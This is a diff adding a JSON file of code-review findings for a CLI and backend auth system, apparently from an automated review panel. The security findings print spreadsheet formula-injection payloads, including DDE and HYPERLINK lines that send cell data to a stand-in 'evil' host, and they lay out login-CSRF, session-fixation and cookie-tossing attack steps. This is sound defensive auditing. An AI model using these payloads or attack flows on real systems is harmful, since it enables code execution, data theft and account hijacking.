@@ -1,0 +1,320 @@
+{
+  "findings": [
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/cells.ts",
+      "searchedFor": [],
+      "summary": "`format()`'s new throw fires *after* the mutation in every un-migrated command, turning a successful write into exit 1 / INVALID_FORMAT",
+      "evidence": "Only `status`, `ctx list` and `schema` call `parseOutputFormat` up front. Every other `output()` call site still passes the raw `opts.format` *after* the request has been sent: `cells.ts:66` (`sheets cells set`), `cells.ts:92` (delete), `cells.ts:139` (batch), `docs.ts:104/136/154` (create/rename/delete), `notes.ts:64+`, `slides.ts:69+`, `sheets-import.ts:91`, `api-keys.ts:20/34/48`, `tabs.ts:16`. With the new `default:` branch in `format()` (formatter.ts:51-55), `wafflebase sheets cells set … --format bogus` now performs the PATCH, then throws inside the try block, and `outputError` sets `process.exitCode = 1` with an INVALID_FORMAT body — so a caller/agent sees a failure for an operation that actually succeeded and may retry it (duplicate writes). Previously the same invocation printed \"undefined\" and exited 0. `api-keys create --format bogus` is worst: the key is created and its one-time secret is discarded, now reported as an error. Fix belongs in those call sites (validate before issuing the request), not in the diff's files.",
+      "lens": "blast-radius",
+      "round_commit": "3a6f5859fe0ea4218e1b18c264ca0660bb9c4ab9"
+    },
+    {
+      "severity": "major",
+      "file": "docs/design/cli.md",
+      "searchedFor": [],
+      "summary": "Design doc still advertises the removed `*` active marker in the command tree",
+      "evidence": "docs/design/cli.md:267 `│     ├── list                             List workspaces (* = active)`. The change deletes `formatWorkspaceList` and its `*` prefix (ctx.ts) and updates the examples at cli.md:455 and the §8.1 prose, but the canonical command tree at line 267 still documents the old prose output. The task doc's checklist item \"`docs/design/cli.md` prose references updated\" (docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md:96) is therefore only partly satisfied, leaving the design doc self-contradictory about the contract this PR changes.",
+      "lens": "design-fit",
+      "round_commit": "3a6f5859fe0ea4218e1b18c264ca0660bb9c4ab9"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/api-keys.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "grep 'output\\(|opts\\.format|outputError' across packages/cli/src",
+        "grep for imports of ../output/formatter.js in packages/cli",
+        "read api-keys.ts, cells.ts, sheets-import.ts, sheets-export.ts, docs.ts, notes.ts, slides.ts action bodies",
+        "read docs/tasks/active/20260806-cli-status-ctx-structured-output-lessons.md (call-site audit claim covers only try/catch presence, not pre-mutation validation)"
+      ],
+      "summary": "New `default:` throw in `format()` fires *after* side effects at the ~12 unvalidated `output()` call sites; only status/ctx/schema validate `--format` up front",
+      "evidence": "formatter.ts:51-55 now throws `InvalidFormatError` from `format()` for any value outside json|table|csv. Only the three commands touched by this diff call `parseOutputFormat(opts.format)` before doing work; every other caller still passes the raw `opts.format` straight into `output()` after the request has already been executed (api-keys.ts:20 `output(res.data, opts.format, false)` after `createApiKey`, cells.ts:66/92/139 after writes, sheets-import.ts:91 after the import, docs/slides/notes create/update). With e.g. `wafflebase api-keys create ci --format jsonl`, the key is created server-side, `format()` throws, `outputError` prints INVALID_FORMAT and sets `process.exitCode = 1` — so a command that succeeded reports failure, and for `api-keys create` the raw key (shown only once, per the comment on line 19) is destroyed with no way to recover it. An agent seeing exit 1 will reasonably retry the mutation, duplicating writes. The guard added in this change (parseOutputFormat before any work) is exactly the right shape but was applied to only 3 of the call sites.",
+      "lens": "correctness",
+      "round_commit": "3a6f5859fe0ea4218e1b18c264ca0660bb9c4ab9"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/api-keys.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "Grep 'api-keys|createApiKey|registerApiKeysCommand' in packages/cli/test",
+        "Glob packages/cli/test/**",
+        "read packages/cli/test/status.test.ts, output.test.ts, ctx.test.ts"
+      ],
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "The api-keys create ordering fix (validate --format *before* minting the key) has no test"
+        }
+      ],
+      "summary": "The safety-critical ordering in `api-keys create` (validate --format BEFORE minting the key) has no test",
+      "evidence": "api-keys.ts:21-27 moves `parseOutputFormat(opts.format)` above `createApiKey(name)` with a comment stating the whole point: \"a bad `--format` must not discard a raw key that the server will never show again.\" No test exercises this. status.test.ts's wiring suite only registers status/ctx/schema (status.test.ts:130-132); namespaces.test.ts only asserts command names/aliases; grep for `createApiKey`/`registerApiKeysCommand` across packages/cli/test finds no invocation of the action handler. A regression that moved the parse back below the API call (re-introducing the key-loss bug) would keep the suite green, since parseOutputFormat itself is tested only in isolation (output.test.ts:56-72).",
+      "lens": "test-adequacy",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "docs/design/cli.md",
+      "claimType": "absence",
+      "searchedFor": [
+        "grep INVALID_|NOT_FOUND|error code in docs/design/cli.md",
+        "read docs/design/cli.md:950-990 (Error Matrix)",
+        "grep 'INVALID_FORMAT' across repo"
+      ],
+      "summary": "New agent-facing error codes (`INVALID_FORMAT`, `NOT_LOGGED_IN`) are not added to §10 Error Matrix, the canonical table agents/skills read for codes",
+      "evidence": "The change introduces two new structured error codes: `InvalidFormatError.code = 'INVALID_FORMAT'` (packages/cli/src/output/formatter.ts:15) and `NotLoggedInError.code = 'NOT_LOGGED_IN'` (packages/cli/src/commands/ctx.ts:36). §8.1 prose mentions them (docs/design/cli.md:722,725) but the canonical enumeration in §10 \"Error Matrix\" (lines 960-976, which lists INVALID_RANGE, FILE_EXISTS, INVALID_DOCX, etc. with exit codes) was left untouched. An agent reading the matrix to learn the code vocabulary will not find either code, nor the exit code (`ctx list` → 1) they imply.",
+      "lens": "design-fit",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "docs/design/cli.md",
+      "searchedFor": [
+        "grep \"class .*Error|code = '\" in packages/cli/src",
+        "read packages/cli/src/docs/content.ts parseContentFormat",
+        "read errorCode() in formatter.ts"
+      ],
+      "summary": "§8.1 now promises `INVALID_FORMAT` for any unsupported `--format`, but the content/export commands it explicitly names still emit code `ERROR`",
+      "evidence": "The added prose reads: \"An unsupported `--format` value is rejected with `\"code\": \"INVALID_FORMAT\"` rather than ignored. Validation is per-command because `docs`/`slides`/`notes` `content` and `export` deliberately reuse the same global `--format` flag …\". That sentence tells an agent those commands also report INVALID_FORMAT, but `parseContentFormat` (packages/cli/src/docs/content.ts:27) throws a plain `Error`, so `outputError`'s `errorCode()` falls back to `'ERROR'` (packages/cli/src/output/formatter.ts:75). The same holds for `detectExportFormat` in packages/cli/src/commands/docs.ts:39 and the slides/notes equivalents. Either those validators should carry `code = 'INVALID_FORMAT'` or the doc should scope the claim to `output()` commands only.",
+      "lens": "design-fit",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/output/csv.ts",
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "CSV output has no formula-injection neutralization; `--format csv` is now promoted as the human path"
+        }
+      ],
+      "summary": "CSV output does not neutralize spreadsheet-formula prefixes; this change adds new server-controlled sinks into the CSV path",
+      "evidence": "`csvEscape` (packages/cli/src/output/csv.ts:15-24) only quotes on `,`/`\"`/`\\n`; it never prefixes values that begin with `=`, `+`, `-`, `@`, tab or CR. Every value it emits is server-supplied and, in a shared workspace, settable by another member (document titles, cell values/formulas, and — newly reachable via this diff — workspace `name` through `wafflebase ctx list --format csv`, `buildWorkspaceList` in packages/cli/src/commands/ctx.ts:27). Attack: a collaborator renames a workspace or document to `=cmd|'/c calc'!A0` (or `=HYPERLINK(\"http://evil/\"&A1)` for exfiltration); the victim runs `wafflebase ctx list --format csv > ws.csv` (a flow the diff's own docs now advertise as \"the human path\") and opens it in Excel/LibreOffice/Sheets, which evaluates the payload. The new `cell()` helper in packages/cli/src/output/table.ts:9 was written to \"mirror what formatCsv already does\", so the same unescaped convention is being propagated rather than fixed. Pre-existing in csv.ts, but the diff widens the reachable data set.",
+      "lens": "security",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/login.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "packages/cli/src/commands/login.ts full read",
+        "grep for state/nonce/csrf in packages/cli/src",
+        "grep for Origin/Sec-Fetch header checks in login.ts"
+      ],
+      "summary": "CLI OAuth loopback callback server accepts any `code` with no `state`/nonce binding (login CSRF / session fixation)",
+      "evidence": "`startCallbackServer` (packages/cli/src/commands/login.ts:168-227) serves `/callback` on 127.0.0.1 and resolves with whatever `code` query parameter arrives (line 177), with no `state` nonce generated at line 36 (`${server}/auth/github?mode=cli&port=${port}`), no Origin/Sec-Fetch-Site check, and no per-attempt secret. Any web page the victim visits during the 30s window (login.ts:229) can issue a no-CORS GET to `http://127.0.0.1:<port>/callback?code=<attacker_code>`; the CLI then exchanges the attacker's code (login.ts:56) and persists the attacker's tokens to ~/.wafflebase/session.json, so the victim's subsequent `wafflebase docs create`/`sheets import` writes their data into the attacker's workspace. I could not confirm exploitability end to end: the backend receives `port` in the authorize URL and may bind the issued code to it, which would force the attacker to guess the victim's ephemeral port — hence low confidence. Entirely outside this diff (pre-existing), surfaced because the diff is the auth/session-surfacing change under review. Searched: packages/cli/src for `state`, `nonce`, `csrf`, `Origin` in the login/callback path; found none.",
+      "lens": "security",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/cells.ts",
+      "searchedFor": [],
+      "summary": "`cells batch` parses `--data`/stdin JSON outside the try block, so malformed input becomes an unhandled promise rejection instead of the structured error body the diff's own rationale relies on",
+      "evidence": "cells.ts:117-127: `cells = JSON.parse(dataStr)` (line 119) and the stdin `JSON.parse` (line 126) sit above the `try` that starts at line 139. In an async commander action a throw here rejects the returned promise; `bin.ts` (line 27, `program.parse()`) installs no rejection handler, so `wafflebase sheets cells batch doc --data '{'` prints a raw stack trace / triggers an unhandled-rejection crash rather than the `{ \"error\": { ... } }` body §8.1 promises. Pre-existing, but it is the exact failure mode the schema.ts hunk of this change cites (\"bin.ts has no top-level handler\") and adjacent to the modified try blocks.",
+      "lens": "correctness",
+      "round_commit": "6d0b9229f8d4ea9bef952afb8f4def6add67c08b"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/login.ts",
+      "searchedFor": [
+        "docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md"
+      ],
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "Large unrequested scope beyond issue #635 (the OAuth loopback nonce / login-CSRF fix, backend `cli-auth.store` + guard + callback changes, CSV formula neutralization, `cells batch` restructure) rides on a PR whose stated outcome is only \"route `status` / `ctx list` through `output()` and validate `--format`\" (docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md §Approach 1–6). The nonce work also introduces a *cross-package version contract* (a CLI at this version refuses callback"
+        },
+        {
+          "severity": "major",
+          "summary": "Bundles a breaking CLI↔backend protocol coupling into a PR whose issue (#635) is about `status`/`ctx list` output formatting"
+        }
+      ],
+      "summary": "Scope creep beyond the originating issue. docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md (#635) scopes this work to routing `status`/`ctx list` through `output()` and validating `--format`; the diff additionally lands a cross-package OAuth protocol change (per-attempt nonce in `cli-auth.store`, guard, callback redirect, loopback server hardening), a CSV formula-injection transform, and a `cells batch` parse restructure. Each is a separable change with its own risk surface (the OAuth one even introduces a backend/CLI version coupling), bundled into an output-formatting PR.",
+      "evidence": "todo.md \"Review round 2\" checklist items lines 116-122 add CSV neutralization, OAuth nonce, and cells-batch parsing to an issue whose Approach (lines 19-41) covers only formatter/status/ctx/schema/docs.",
+      "lens": "design-fit",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "docs/design/cli.md",
+      "searchedFor": [
+        "grep 'output\\(|JSON.stringify|console.log' across packages/cli/src",
+        "read packages/cli/src/files/upload.ts",
+        "read packages/cli/src/files/download.ts hits"
+      ],
+      "summary": "New §8.1 text asserts \"Every command that renders a *structured result* routes it through `output()`\" and enumerates exactly one remaining gap (docs/slides/notes `import`). `files upload` also emits a structured command result — `io.stdout(JSON.stringify(res.data, null, 2))` at packages/cli/src/files/upload.ts:222 — never reads `--format`, and is not listed among the exceptions, so the design doc states a contract the code does not meet.",
+      "lens": "design-fit",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "critical",
+      "file": "packages/backend/src/auth/github.strategy.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "grep for `state` in packages/backend/src/auth",
+        "read github.strategy.ts authenticate()",
+        "read auth.controller.ts githubAuth / githubAuthCallback",
+        "grep createState/consumeState across backend/src"
+      ],
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "The web GitHub OAuth flow still has no `state` CSRF parameter, so `/auth/github/callback` sets session cookies for whatever code is presented (login CSRF / session fixation) — the exact class this PR fixes for the CLI"
+        }
+      ],
+      "summary": "Web GitHub OAuth flow still has no `state` parameter — login CSRF / session fixation on the browser login path",
+      "evidence": "`GitHubStrategy.authenticate` (github.strategy.ts:57-64) sets `opts.state` ONLY when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` (github-auth.guard.ts:33) only mints that token for `mode === 'cli'`. A plain browser login therefore goes to GitHub with no `state`, and `githubAuthCallback` (auth.controller.ts:119) falls straight through to the web branch (auth.controller.ts:146-150) whenever no `state` query param is present, unconditionally calling `setAuthCookies`. Attack: attacker starts a GitHub OAuth flow for their own account, captures the `code` at the redirect, does not spend it, then causes the victim's browser to top-level-navigate to `https://<api>/auth/github/callback?code=<attacker code>`. The backend resolves the attacker's GitHub identity and writes `wafflebase_session` / `wafflebase_refresh` cookies (SameSite=Lax, so a top-level navigation carries them) into the victim's browser. The victim then works inside the attacker's account and everything they create is readable by the attacker. This diff touches exactly this handler and its risk table, and records the gap as \"Open\" in docs/design/rest-api.md, so it is pre-existing and disclosed rather than introduced here — but it is a live session-fixation vulnerability in the code under review and the CLI half of the same class was judged worth fixing in this very change.",
+      "lens": "security",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/backend/src/auth/github-auth.guard.ts",
+      "summary": "`GET /auth/github?mode=cli&port=<n>` is an unauthenticated, CSRF-able endpoint that mints a full-privilege auth code for the *victim* and delivers it to an attacker-chosen 127.0.0.1 port; the new nonce does not help because the attacker supplies the nonce",
+      "evidence": "The guard accepts `mode`/`port`/`nonce` straight off the query string with no user-intent or origin check (github-auth.guard.ts:29-42), and the callback redirects the browser to `http://127.0.0.1:${port}/callback?code=...` (auth.controller.ts:134-136). An attacker page can top-level-navigate the victim to `https://<api>/auth/github?mode=cli&port=<attacker-chosen>&nonce=<attacker-chosen>`; because the victim is already logged in to GitHub and has already authorized the app, GitHub bounces straight back, and the backend mints `createCode(user.id)` for the VICTIM and hands it to whatever is listening on that loopback port. `POST /auth/cli/exchange` is unauthenticated (auth.controller.ts:153-169), so anyone holding that code within 60s gets the victim's access+refresh tokens. The nonce added by this change does not close this direction — the attacker chooses it, so the loopback listener they control accepts it. Exploitation needs an attacker-controlled or URL-logging listener on the victim's loopback (a malicious/compromised local app, a dev server that logs request URLs, a browser-helper daemon), which is why I rate confidence medium rather than high. The CLI's own genuine listener is protected, because its nonce will not match.",
+      "lens": "security",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/sheets-export.ts",
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "CSV formula neutralization is explicitly disabled on `sheets export`, the one path that writes a file a user opens in Excel — CSV injection survives there"
+        }
+      ],
+      "summary": "CSV formula neutralization is deliberately disabled on `sheets export`, the one CSV path whose file is meant to be opened in a spreadsheet app — untrusted cell content is written verbatim",
+      "evidence": "`formatCsv(res.data, { neutralizeFormulas: false })` writes server-supplied cell `value`/`formula` fields byte-for-byte into `out.csv`. Every one of those values is settable by any other member of a shared workspace, and `packages/cli/skills/recipe-csv-pipeline.md:44` documents `wafflebase sheets export \"$DOC_ID\" out.csv` as the terminal step whose product the user opens. A member who plants `=HYPERLINK(\"http://evil?d=\"&A1,\"click\")`, `=WEBSERVICE(...)` (exfiltration) or a DDE payload `=cmd|'/c calc'!A0` gets it executed when the exporting user opens the file in Excel/LibreOffice. The protection this change adds (`csv.ts:23-26`) is wired only into the `--format csv` render path (formatter.ts:61), i.e. the terminal-printed variant, while the file-writing variant opts out. Whatever the round-trip argument, the result is that the more dangerous of the two paths is the unprotected one; a safer split would keep neutralization and give `sheets export` an explicit opt-out flag, or write a format (json) that is not auto-evaluated.",
+      "lens": "security",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/output/csv.ts",
+      "summary": "CSV formula neutralizer omits a leading plain space from `FORMULA_TRIGGER`, despite its own comment justifying `\\t`/`\\r` as \"whitespace the importer trims\"",
+      "evidence": "`FORMULA_TRIGGER = /^[=+\\-@\\t\\r]/` covers tab and CR but not U+0020 (or other Unicode whitespace such as U+00A0). `NEEDS_QUOTING = /[\",\\n\\r\\t]/` also does not quote a leading space, so a value of `\" =HYPERLINK(\\\"http://evil\\\",\\\"x\\\")\"` is emitted bare and unprefixed. Importers that strip leading whitespace on import (LibreOffice's \"Trim spaces\" CSV option, and several third-party CSV-to-sheet importers) then see `=HYPERLINK(...)` at position 0 and evaluate it — exactly the bypass class the tab/CR entries were added to close. Confidence is low because stock Excel does not trim a leading space, so the bypass depends on the importer; impact if it lands is the same formula execution the neutralizer exists to prevent.",
+      "lens": "security",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/backend/src/auth/auth.controller.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "grep -i csrf across packages/backend/src",
+        "read packages/backend/src/auth/github.strategy.ts (authenticate/state injection)",
+        "read packages/backend/src/auth/auth.controller.ts githubAuthCallback + web branch",
+        "grep createState( across packages to find every state-minting site",
+        "checked GitHubAuthGuard.canActivate for a non-CLI state path"
+      ],
+      "summary": "Web (browser) OAuth callback has no CSRF `state` — login CSRF / session fixation remains fully open while the CLI half is hardened",
+      "evidence": "`githubAuthCallback` only consumes a state token when the query carries one (line 119). Every browser login arrives with no `state`: `GitHubStrategy.authenticate` (github.strategy.ts:59-62) sets `opts.state` *only* when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` only mints that token for `mode === 'cli'` (github-auth.guard.ts:33). So the web branch at auth.controller.ts:146-150 mints tokens and calls `setAuthCookies` for any `code` presented, with nothing binding the code to the browser that started the flow.\n\nAttack: attacker starts a GitHub OAuth flow for their own account, stops at the redirect and captures `code=X`, then gets the victim to load `https://<backend>/auth/github/callback?code=X` (image, iframe, link). The victim's browser receives `Set-Cookie: wafflebase_session=<attacker's JWT>` (httpOnly, SameSite=Lax — a top-level navigation carries it fine) and is redirected to FRONTEND_URL. The victim now works inside the attacker's account: everything they create, upload or paste lands in a workspace the attacker owns.\n\nThis is pre-existing and the diff itself adds a risk-table row (`docs/design/rest-api.md`) marking it **Open**. I am reporting it because the change hardens exactly this class of attack on the CLI leg while leaving the higher-traffic browser leg unbound, and an acknowledged-in-docs vulnerability is still a vulnerability.",
+      "lens": "security",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/commands/login.ts",
+      "searchedFor": [],
+      "mergedFrom": [
+        {
+          "severity": "major",
+          "summary": "Loopback callback rejects any request carrying an `Origin` header, which can refuse the genuine browser redirect and hang login for the full timeout"
+        },
+        {
+          "severity": "major",
+          "summary": "Blanket `Origin` header rejection can refuse the genuine browser redirect, breaking every login"
+        }
+      ],
+      "summary": "Callback server rejects any request carrying an `Origin` header, which risks refusing the genuine browser redirect on browsers/proxies that attach one",
+      "evidence": "`if (req.method !== 'GET' || req.headers.origin !== undefined) { 403 }`. The real callback arrives as a cross-origin 302 redirect from the backend; if any browser, extension, or corporate proxy attaches an `Origin` (e.g. `Origin: null` on cross-origin redirect chains), the legitimate code is refused and, because the 403 branch deliberately never settles the promise (line 227-233), `waitForCallback()` hangs until the 30s timeout and login fails with a timeout error the user cannot diagnose. Only node `fetch` (which never sets Origin unless asked) is exercised in packages/cli/test/login.test.ts.",
+      "lens": "correctness",
+      "round_commit": "4a7f707c050d9bdedf823a75c0425105236a68f6"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/util/csv-parse.ts",
+      "searchedFor": [],
+      "summary": "`--raw`'s stated contract (\"so `sheets import` round-trips formulas\") does not hold at the import call site the diff never touched",
+      "evidence": "The new `--raw` flag exists only to make an export→import round trip preserve formulas (`packages/cli/src/commands/sheets-export.ts:31-34`, `packages/cli/skills/sheets-import-export.md:104-107`, `packages/cli/skills/recipe-csv-pipeline.md:47-51`, `scripts/agent/charters/round-trip.md:15`). The importer it names cannot do that: `buildCellMap` (packages/cli/src/util/csv-parse.ts:93) emits `cells[ref] = { value }` and never a `formula`, and the backend keeps them as distinct fields — `packages/backend/src/api/v1/cells.controller.ts:123` writes `f: body.formula ?? existing?.f`, so a value of `=SUM(B2:B100)` is stored as text, not a formula, with or without `--raw`. Worse, `sheets export` serializes the `getCells` response, which is a list of `{ ref, value, formula }` records (see the fixture in packages/cli/test/sheets-export.test.ts:59-62), so the CSV is a three-column table with a `ref,value,formula` header, not a cell grid; re-importing it lands the literal strings `ref`/`value`/`formula` and `E2`/`E3` into A1:C3. The consequence is that users and agents following the skill docs pass `--raw` — switching off the new CSV-injection guard — in exchange for a round trip that does not work. Fix belongs either on the docs/flag rationale or on `sheets-import` (map a `formula` column onto the `formula` field).",
+      "lens": "blast-radius",
+      "round_commit": "4e0fb74be4cb7d1d729939203ec89bbb3afac5e7"
+    },
+    {
+      "severity": "major",
+      "file": "packages/frontend/src/components/login-form.tsx",
+      "claimType": "absence",
+      "searchedFor": [
+        "Grep 'login-form|LoginForm' in packages/frontend",
+        "Grep 'oauth_state' repo-wide",
+        "Glob packages/frontend/**/*.test.tsx"
+      ],
+      "summary": "New login-error UI (LOGIN_ERRORS map + generic fallback + page wiring of ?error=) has no test at all",
+      "evidence": "login-form.tsx adds an `error` prop, a `LOGIN_ERRORS` code→message map, a `GENERIC_LOGIN_ERROR` fallback for unknown codes, and a `role=\"alert\"` element; login/page.tsx wires `useSearchParams().get(\"error\")` into it. This is the entire user-visible half of the new OAuth-state refusal path (backend redirects to `/login?error=oauth_state`). Grep for `login-form`/`LoginForm` in packages/frontend returns only login-form.tsx, app/login/page.tsx and README.md — no test file. The frontend has a running vitest lane with many component tests (e.g. packages/frontend/tests/components/theme-provider.test.tsx), so this is not an untestable area. Nothing would fail if the alert were never rendered, if the `oauth_state` key were misspelled (silently degrading every user to the generic message), or if page.tsx stopped passing the param.",
+      "lens": "test-adequacy",
+      "round_commit": "4e0fb74be4cb7d1d729939203ec89bbb3afac5e7"
+    },
+    {
+      "severity": "major",
+      "file": "docs/design/rest-api.md",
+      "summary": "`rest-api.md` §7 still specifies the now-wrong callback behavior: \"requires a `state` on **every** path; a callback without one is a 400, never a sign-in.\" The shipped controller redirects instead (`auth.controller.ts:144-146` → `res.redirect(this.loginErrorUrl('oauth_state'))`), and this same change's `backend.md` hunk documents the redirect explicitly (\"redirected to `FRONTEND_URL/login?error=oauth_state`, not answered with a 400\"). Two canonical design docs now describe the same endpoint contradictorily, and the one an API consumer reads first (rest-api.md) is the stale one. The originating task doc even claims round 8 \"only corrects that row's now-stale 'a callback with no `state` is a 400'\" — the risk-table row was corrected but this §7 bullet was not.",
+      "evidence": "docs/design/rest-api.md:354-355 vs docs/design/backend.md callback section and packages/backend/src/auth/auth.controller.ts:144-146",
+      "lens": "design-fit",
+      "round_commit": "4e0fb74be4cb7d1d729939203ec89bbb3afac5e7"
+    },
+    {
+      "severity": "major",
+      "file": "packages/backend/src/auth/cli-login-confirm.middleware.ts",
+      "summary": "Scope: the originating issue (docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md, \"#635 — route `status`/`ctx list` through `output()`\") is a CLI output-formatting defect whose stated approach is six steps confined to `packages/cli/src/output`, `status.ts`, `ctx.ts`, the schema registry and cli.md prose. This diff additionally lands a backend auth architecture change (new `oauth-state.ts` double-submit module, new `CliLoginConfirmMiddleware` + interstitial HTML consent page, two new cookies, a mandatory callback `state` on every path, a rewritten `GitHubAuthGuard`), a CLI login-protocol change, a CSV formula-neutralization feature with a new `--raw` flag, and a frontend login error surface. None of that is in the issue's outcome/acceptance list. The todo records the panel raising this three times and the author rebutting it (\"round-2 requests\"), so a verifier should weigh that rebuttal — but the fit objection is real: a change to how every user of the product authenticates is now gated behind a CLI formatting issue, with no separate issue or design doc of its own.",
+      "evidence": "docs/tasks/active/20260806-cli-status-ctx-structured-output-todo.md:1-41 (Problem/Approach) vs the backend/`login.ts`/`csv.ts` hunks in this diff",
+      "lens": "design-fit",
+      "round_commit": "4e0fb74be4cb7d1d729939203ec89bbb3afac5e7"
+    },
+    {
+      "severity": "major",
+      "file": "packages/backend/src/auth/oauth-state.ts",
+      "searchedFor": [],
+      "summary": "Browser OAuth `state` is an unauthenticated double-submit cookie with no `__Host-` prefix and no server-side binding, so a sibling-subdomain foothold restores login CSRF",
+      "evidence": "`oauthStateCookieOptions()` sets `wafflebase_oauth_state` with `path:'/auth'` and no `__Host-` prefix (oauth-state.ts:57-68), and `webOAuthStateMatches` accepts any `state` whose SHA-256 preimage happens to be in that cookie (oauth-state.ts:47-55). The value is a bare random secret, not an HMAC over anything the server can re-derive. Cookie tossing is therefore the whole attack: an attacker who controls or XSSes ANY sibling host under the registrable domain (e.g. `blog.example.com`, a staging host, a takeover-able CNAME) sets `Set-Cookie: wafflebase_oauth_state=<their secret>; Domain=example.com; Path=/auth`, then navigates the victim to `/auth/github/callback?code=<code minted for the ATTACKER's GitHub account>&state=web.<sha256(their secret)>`. auth.controller.ts:148-159 finds a match, falls through to line 189-192, and issues `wafflebase_session`/`wafflebase_refresh` for the attacker's account in the victim's browser — the exact session-fixation the change set out to close. `__Host-` prefixing (which forbids `Domain=` and forces `Path=/`), or making `state` an HMAC over a server secret, removes the cookie-tossing degree of freedom. The same applies to `wafflebase_cli_confirm` (cli-login-confirm.middleware.ts:33-41), whose secret is likewise only proven by cookie possession.",
+      "lens": "security",
+      "round_commit": "4e0fb74be4cb7d1d729939203ec89bbb3afac5e7"
+    },
+    {
+      "severity": "major",
+      "file": "packages/cli/src/schema/registry.ts",
+      "searchedFor": [],
+      "summary": "`sheets import` silently ignores `--start` for exported `ref,value,formula` CSVs, but the agent-facing schema still advertises it unconditionally",
+      "evidence": "`sheets-import.ts` now branches on `isCellTable(rows)` and calls `buildCellMapFromTable(rows)`, which imports by reference and never uses `parseStartRef(localOpts.start)`. The schema registry entry for `sheets.import` (registry.ts:556-562) still lists `'--start': { type: 'string', ..., description: 'Top-left cell', default: 'A1' }` with no note that it is inert for the header this repo's own `sheets export` writes, and `packages/documentation/developers/cli.md:348` likewise documents `--start <ref> | Top-left cell for import | A1` unqualified (the by-reference behaviour is only mentioned in the *export* section at line 392). `docs/design/cli.md` says the schema is the agent interface; round 8 of this PR treated exactly this class of gap (`--raw` missing from the registry) as blocking and added a flag-name parity test — which cannot catch a flag whose documented meaning no longer matches. Design-fit corollary: the round-trip is opted into explicitly on export (`--raw`) but switched implicitly on import via header sniffing, so a user-authored grid CSV whose first three columns happen to be named ref/value/formula changes import semantics and drops `--start` with no diagnostic.",
+      "lens": "design-fit",
+      "round_commit": "b4511d12183b4f7f96f869ccea495074e6a459bd"
+    },
+    {
+      "severity": "major",
+      "file": "packages/backend/src/auth/auth.controller.ts",
+      "claimType": "absence",
+      "searchedFor": [
+        "grep createCode / consumeCode across packages/backend/src",
+        "read packages/backend/src/auth/cli-auth.store.ts in full",
+        "read cliExchange handler in auth.controller.ts",
+        "read packages/cli/src/commands/login.ts exchange call (no nonce in body)"
+      ],
+      "summary": "CLI auth code is a pure bearer credential — `POST /auth/cli/exchange` requires no proof of possession, even though the new per-attempt nonce is already stored server-side and could bind it",
+      "evidence": "`createCode(user.id)` (auth.controller.ts:173) mints a code bound to nothing but the user id, and `cliExchange` (auth.controller.ts:203-216) trades that code for full access+refresh JWTs with no authentication and no binding to the login attempt. The code is delivered to the browser as a plaintext HTTP GET: `http://127.0.0.1:${port}/callback?code=...` (auth.controller.ts:182), where `port` came off the query string. Anyone who observes that URL — a local listener on the chosen port, a URL-logging local service, a browser extension reading the navigation, browser history/sync — can replay the code within its 60s TTL and obtain the victim's full session. The change already carries the material for a PKCE-style fix: `CliAuthStore` now stores `nonce` per state (cli-auth.store.ts:13), so `cli/exchange` could require the nonce (or a hash of it) alongside the code and reject a code presented without it. It does not. Note this is exactly the direction the confirmation gate cannot cover: once the user clicks Continue on `?mode=cli&port=<attacker's>`, the code goes to a port the attacker picked.",
+      "lens": "security",
+      "round_commit": "b4511d12183b4f7f96f869ccea495074e6a459bd"
+    },
+    {
+      "severity": "critical",
+      "file": "packages/backend/src/auth/github-auth.guard.ts",
+      "summary": "CLI OAuth state token is not bound to the browser that obtained it, so the new `CliLoginConfirmMiddleware` consent gate is fully bypassable",
